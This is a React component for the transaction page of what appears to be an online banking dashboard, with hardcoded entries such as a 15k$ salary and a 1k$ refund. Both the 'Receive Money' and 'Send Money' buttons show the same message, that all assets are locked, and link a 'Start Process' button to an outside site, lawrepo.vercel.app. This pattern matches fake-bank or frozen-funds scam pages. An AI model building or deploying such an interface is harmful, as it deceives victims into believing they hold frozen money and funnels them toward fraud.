
import Topnav from "./Topnav"
import Downmenu from "./Downmenu"
import Sidemenu3 from "./Sidemenu3"
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog"
import { Button } from "@/components/ui/button"
import Deposit from '../assets/Deposit.svg'
import leave from '../assets/leave.svg'
import locklight from '../assets/Locklight.svg'
import Check from '../assets/Check.svg'



export default function Transaction() {
  return (

    <>
        <div className="w-full lg:px-40 bg-slate-50 fixed top-0 text-sm  md:w-full">
    <Topnav/>
      </div>
      <Downmenu/>
    
      <div className="lg:flex  justify-center">
      <div className="lg:py-40  lg:fixed left-5">
        <Sidemenu3/>
      </div>
      <div className="lg:px-40 py-32 lg:ml-64 lg:py-40 px-5 ">
        <div className="    mb-10 text-2xl font-medium flex justify-between">
                    <AlertDialog>
              <AlertDialogTrigger><Button  className="bg-gray-500 flex gap-2"   > <img src={locklight} alt="" /> Receive Money</Button></AlertDialogTrigger>
              <AlertDialogContent className="">
                <AlertDialogHeader>
                  <AlertDialogTitle>Account has been locked</AlertDialogTitle>
                  <AlertDialogDescription className="">
                    All your assets are locked you can begin the release of funds by clicking on start process
                  </AlertDialogDescription>
                </AlertDialogHeader>
                <AlertDialogFooter>
                  <AlertDialogCancel className="bg-red-600 text-white">Cancel</AlertDialogCancel>
                  <AlertDialogAction className="bg-blue-700">
                  <a href="https://lawrepo.vercel.app/"   target="_blank" >
                         Start Process
                    </a> 
                  </AlertDialogAction>
                </AlertDialogFooter>
              </AlertDialogContent>
            </AlertDialog>
                    <AlertDialog>
              <AlertDialogTrigger><Button  className="bg-gray-500 flex gap-2"><img src={locklight} alt="" />Send Money</Button></AlertDialogTrigger>
              <AlertDialogContent className="">
                <AlertDialogHeader>
                  <AlertDialogTitle>Account has been locked</AlertDialogTitle>
                  <AlertDialogDescription className="">
                  All your assets are locked you can begin the release of funds by clicking on start process
                  </AlertDialogDescription>
                </AlertDialogHeader>
                <AlertDialogFooter>
                  <AlertDialogCancel className="bg-red-600 text-white">Cancel</AlertDialogCancel>
                  <AlertDialogAction className="bg-blue-700">
                  <a href="https://lawrepo.vercel.app/"   target="_blank" >
                         Start Process
                    </a> 
                  </AlertDialogAction>
                </AlertDialogFooter>
              </AlertDialogContent>
            </AlertDialog>

          
        </div>
            
            <div className="lg:gap-16 justify-between flex bg-slate-50 border-b-2 py-5 b w-full px-2  items-center mb-3 hover:bg-slate-100">
            <div>
              <img src={Check} alt="" />
            </div>
            <div className="w-32 lg:w-40">
              <p>Salary</p>
            <div className="text-xs text-slate-500">
              Monthly salary with allowance and Benefits
            </div>
            </div>
            <div>
              <p> 15k$</p>
            </div>
            <div>
            <img src={Deposit} alt="" />
            </div>
            </div>
            <div className="lg:gap-16 justify-between flex bg-slate-50 border-b-2 py-5 b w-full px-2  items-center mb-3 hover:bg-slate-100">
            <div>
              <img src={Check} alt="" />
            </div>
            <div className="w-32 lg:w-40">
              <p>Rent</p>
            <div className="text-xs text-slate-500">
              Money for the rent of appartment
            </div>
            </div>
            <div>
              <p> -2k$</p>
            </div>
            <div>
            <div>
            <img src={leave} alt="" />
            </div>
            </div>
            
            </div>
            <div className="lg:gap-16 justify-between flex bg-slate-50 border-b-2 py-5 b w-full px-2  items-center mb-3 hover:bg-slate-100">
            <div>
              <img src={Check} alt="" />
            </div>
            <div className="w-32 lg:w-40">
              <p>Subscription</p>
            <div className="text-xs text-slate-500">
              Payment of Netflix sub
            </div>
            </div>
            <div>
              <p> -60$</p>
            </div>
            <div>
            <img src={leave} alt="" />
            </div>
            </div>
            <div className="lg:gap-16 justify-between flex bg-slate-50 border-b-2 py-5 b w-full px-2  items-center mb-3 hover:bg-slate-100">
            <div>
              <img src={Check} alt="" />
            </div>
            <div className="w-32 lg:w-40">
              <p>Refund</p>
            <div className="text-xs text-slate-500">
              Payment for Request for Refund on service
            </div>
            </div>
            <div>
              <p> 1k$</p>
            </div>
            <div>
            <img src={Deposit} alt="" />
            </div>
            </div>
            <div className="lg:gap-16 justify-between flex bg-slate-50 border-b-2 py-5 b w-full px-2  items-center mb-3 hover:bg-slate-100">
            <div>
              <img src={Check} alt="" />
            </div>
            <div className="w-32 lg:w-40">
              <p>Utilities</p>
            <div className="text-xs text-slate-500">
              Payment of Energy, Water etc
            </div>
            </div>
            <div>
              <p> -2k$</p>
            </div>
            <div>
            <img src={leave} alt="" />
            </div>
            </div>
          </div>
          </div>
            
            

      
    </>


          
          
  )
}
